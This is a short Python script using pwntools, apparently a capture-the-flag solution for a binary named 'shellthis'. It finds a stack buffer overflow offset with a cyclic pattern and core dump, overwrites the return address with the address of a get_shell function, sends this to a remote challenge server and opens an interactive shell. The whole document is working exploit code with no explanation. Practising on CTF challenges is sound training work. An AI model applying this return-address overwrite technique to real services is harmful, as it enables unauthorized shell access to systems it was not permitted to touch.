from pwn import *
io_local = process('./shellthis')
io = remote('chal.duc.tf', 30002)

e = ELF('./shellthis')
win = e.symbols['get_shell']
print(hex(win))

# get offset
io_local.recv()
io_local.sendline(cyclic(100, n=8))
io_local.wait()
core = Core('./core')
offset = cyclic_find(core.fault_addr, n=8)
print(offset)

# exploit
data = io.recv()
p = offset * b'A'
p += p64(win)
io.sendline(p)
io.interactive()
